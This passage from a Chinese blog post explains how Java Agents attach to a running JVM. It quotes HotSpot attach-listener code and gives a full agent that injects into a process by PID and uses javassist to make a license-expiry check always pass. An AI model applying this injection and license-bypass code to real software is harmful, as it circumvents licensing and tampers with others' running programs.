jcmd &#125;,</span><br><span class="line">  &#123; <span class="literal">NULL</span>,               <span class="literal">NULL</span> &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于加载Agent来说，命令就是“load”。</p><p>任务从哪来，这个秘密就藏在AttachListener::dequeue这行代码里面，接下来来分析一下dequeue这个函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">LinuxAttachOperation* LinuxAttachListener::dequeue() &#123;</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="comment">// wait for client to connect</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">    RESTARTABLE(::accept(listener(), &amp;addr, &amp;len), s);</span><br><span class="line">    <span class="comment">// get the credentials of the peer and check the effective uid/guid</span></span><br><span class="line">    <span class="comment">// - check with jeff on this.</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucred</span> <span class="title">cred_info</span>;</span></span><br><span class="line">    <span class="keyword">socklen_t</span> optlen = <span class="keyword">sizeof</span>(cred_info);</span><br><span class="line">    <span class="keyword">if</span> (::getsockopt(s, SOL_SOCKET, SO_PEERCRED, (<span class="keyword">void</span>*)&amp;cred_info, &amp;optlen) == <span class="number">-1</span>) &#123;</span><br><span class="line">      ::<span class="built_in">close</span>(s);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// peer credential look okay so we read the request</span></span><br><span class="line">    LinuxAttachOperation* op = read_request(s);</span><br><span class="line">    <span class="keyword">return</span> op;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码表明，Attach Listener在某个端口监听着，通过accept来接收一个连接，然后从这个连接里面将请求读取出来，然后将请求包装成一个AttachOperation类型的对象，之后就会从表里查询对应的处理函数，然后进行处理。</p><p>Attach Listener使用一种被称为“懒加载”的策略进行初始化，也就是说，JVM启动的时候Attach Listener并不一定会启动起来。</p><h3 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h3><p>运行时Attach方法里面的关键是调用VirtualMachine的attach方法进行Agent挂载的功能。</p><p>下面分析一下VirtualMachine的attach方法具体是怎么实现的。</p><p>Attach模式需要知道我们运行的Java程序进程ID，通过Java虚拟机的进程注入方式实现可以将我们的Agent程序动态的注入到一个已在运行中的Java程序中。</p><p>还是之前那个例子，可以使用<code>jps -l</code>命令进行查看：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210194815301.png" alt="image-20210210194815301"></p><p>Java代码实现可以使用<code>com.sun.tools.attach.VirtualMachine</code>的<code>list</code>方法即可获取本机所有运行的Java进程，如：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210200251210.png" alt="image-20210210200251210"></p><p>有了进程ID我们就可以使用Attach API注入Agent了，Attach Java进程注入通用示例代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Java进程ID</span></span><br><span class="line">String pid = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置Agent文件的绝对路径</span></span><br><span class="line">String agentPath = <span class="string">"/xxx/agent.jar"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入到JVM虚拟机进程</span></span><br><span class="line">VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 注入Agent到目标JVM</span></span><br><span class="line">vm.loadAgent(agentPath);</span><br><span class="line">vm.detach();</span><br></pre></td></tr></table></figure><p>使用Attach模式启动Agent程序时需要使用到JDK目录下的<code>lib/tools.jar</code>，如果没有配置<code>CLASS_PATH</code>环境变量的话需要在运行Agent程序时添加<code>-Xbootclasspath/a:$JAVA_HOME/lib/tools.jar</code>参数，否则无法使用Attach API。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xbootclasspath/a:$JAVA_HOME/lib/tools.jar -jar AgentAttach<span class="number">-1.0</span>-SNAPSHOT.jar</span><br></pre></td></tr></table></figure><p>首先后台运行监测代码，用我们的jar包获取目标进程：16281</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210222948056.png" alt="image-20210210222948056"></p><p>接下来直接注入就完事了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Xbootclasspath/a:$JAVA_HOME/lib/tools.jar -classpath $JAVA_HOME/lib/tools.jar:AgentAttach-<span class="number">1.0</span>-SNAPSHOT.jar -jar AgentAttach-<span class="number">1.0</span>-SNAPSHOT.jar <span class="number">16281</span></span><br></pre></td></tr></table></figure><p>成功修改：</p><p><img src="../images/Java-Agent%E8%A7%A3%E8%AF%BB/image-20210210223115419.png" alt="image-20210210223115419"></p><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AttachAgent</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 需要被Hook的类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String HOOK_CLASS = <span class="string">"com.sec.CheckLicense"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">            List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">            <span class="keyword">for</span> (VirtualMachineDescriptor desc : list) &#123;</span><br><span class="line">                System.out.println(<span class="string">"进程ID："</span> + desc.id() + <span class="string">"，进程名称："</span> + desc.displayName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Java进程ID</span></span><br><span class="line">        String pid = args[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 注入到JVM虚拟机进程</span></span><br><span class="line">            VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取当前Agent的jar包路径</span></span><br><span class="line">            URL agentURL = AttachAgent<span class="class">.<span class="keyword">class</span>.<span class="title">getProtectionDomain</span>().<span class="title">getCodeSource</span>().<span class="title">getLocation</span>()</span>;</span><br><span class="line">            String agentPath = <span class="keyword">new</span> File(agentURL.toURI()).getAbsolutePath();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 注入Agent到目标JVM</span></span><br><span class="line">            vm.loadAgent(agentPath);</span><br><span class="line">            vm.detach();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">agentmain</span><span class="params">(String args, <span class="keyword">final</span> Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        loadAgent(args, inst);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">loadAgent</span><span class="params">(String arg, <span class="keyword">final</span> Instrumentation inst)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 创建ClassFileTransformer对象</span></span><br><span class="line">        ClassFileTransformer classFileTransformer = createClassFileTransformer();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 添加自定义的Transformer，第二个参数true表示是否允许Agent Retransform，</span></span><br><span class="line">        <span class="comment">// 需配合MANIFEST.MF中的Can-Retransform-Classes: true配置</span></span><br><span class="line">        inst.addTransformer(classFileTransformer, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取所有已经被JVM加载的类对象</span></span><br><span class="line">        Class[] loadedClass = inst.getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Class clazz : loadedClass) &#123;</span><br><span class="line">            String className = clazz.getName();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (inst.isModifiableClass(clazz)) &#123;</span><br><span class="line">                <span class="comment">// 使用Agent重新加载HelloWorld类的字节码</span></span><br><span class="line">                <span class="keyword">if</span> (className.equals(HOOK_CLASS)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        inst.retransformClasses(clazz);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (UnmodifiableClassException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> ClassFileTransformer <span class="title">createClassFileTransformer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ClassFileTransformer() &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * 类文件转换方法，重写transform方法可获取到待加载的类相关信息</span></span><br><span class="line"><span class="comment">             *</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> loader              定义要转换的类加载器；如果是引导加载器，则为 null</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> className           类名,如:java/lang/Runtime</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> protectionDomain    要定义或重定义的类的保护域</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@param</span> classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span></span><br><span class="line"><span class="comment">             * <span class="doctag">@return</span> 字节码byte数组。</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                                    ProtectionDomain protectionDomain, <span class="keyword">byte</span>[] classfileBuffer) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 将目录路径替换成Java类名</span></span><br><span class="line">                className = className.replace(<span class="string">"/"</span>, <span class="string">"."</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 只处理HOOK_CLASS类的字节码</span></span><br><span class="line">                <span class="keyword">if</span> (className.equals(HOOK_CLASS)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 使用javassist将类二进制解析成CtClass对象</span></span><br><span class="line">                        CtClass ctClass = classPool.makeClass(<span class="keyword">new</span> ByteArrayInputStream(classfileBuffer));</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 使用CtClass对象获取checkExpiry方法，类似于Java反射机制的clazz.getDeclaredMethod(xxx)</span></span><br><span class="line">                        CtMethod ctMethod = ctClass.getDeclaredMethod(</span><br><span class="line">                                <span class="string">"checkExpiry"</span>, <span class="keyword">new</span> CtClass[]&#123;classPool.getCtClass(<span class="string">"java.lang.String"</span>)&#125;</span><br><span class="line">                        );</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 在checkExpiry方法执行前插入输出License到期时间代码</span></span><br><span class="line">                        ctMethod.insertBefore(<span class="string">"System.out.println(\"License到期时间：\" + $1);"</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 修改checkExpiry方法的返回值，将授权过期改为未过期</span></span><br><span class="line">                        ctMethod.insertAfter(<span class="string">"return false;"</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 修改后的类字节码</span></span><br><span class="line">                        classfileBuffer = ctClass.toBytecode();</span><br><span class="line">                        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.javassist/javassist --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>system<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">systemPath</span>&gt;</span>$&#123;java.home&#125;/../lib/tools.jar<span class="tag">&lt;/<span class="name">systemPath</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.8.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jar-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">archive</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">addClasspath</span>&gt;</span>true<span class="tag">&lt;/<span class="name">addClasspath</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">mainClass</span>&gt;</span>com.fxc.AttachAgent<span class="tag">&lt;/<span class="name">mainClass</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Agent-Class</span>&gt;</span>com.fxc.AttachAgent<span class="tag">&lt;/<span class="name">Agent-Class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Redefine-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Redefine-Classes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">Can-Retransform-Classes</span>&gt;</span>true<span class="tag">&lt;/<span class="name">Can-Retransform-Classes</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">manifestEntries</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-shade-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">executions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">execution</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">goal</span>&gt;</span>shade<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">filters</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">artifact</span>&gt;</span>*:*<span class="tag">&lt;/<span class="name">artifact</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>MANIFEST.MF<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/DEPENDENCIES<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/LICENSE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">exclude</span>&gt;</span>META-INF/NOTICE*<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">filters</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="tag">&lt;<span class="name">artifactSet</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">include</span>&gt;</span>org.javassist:javassist:jar:*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">artifactSet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                            <span class="comment">&lt;!-- 修改第三方依赖包名称 --&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">relocations</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">relocation</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">shadedPattern</span>&gt;</span>com.fxc.deps.javassist<span class="tag">&lt;/<span class="name">shadedPattern</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">relocation</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">relocations</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h1><ol><li>在打包jar的时候，已经要记得将ASM/javassist打进去，maven-shade-plugin插件。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;空山新雨后，天色晚来秋。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;整理Java Agent相关知识 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Java Agent" scheme="https://0range228.github.io/tags/Java-Agent/"/>
    
  </entry>
  
  <entry>
    <title>JFR笔记</title>
    <link href="https://0range228.github.io/JFR%E7%AC%94%E8%AE%B0/"/>
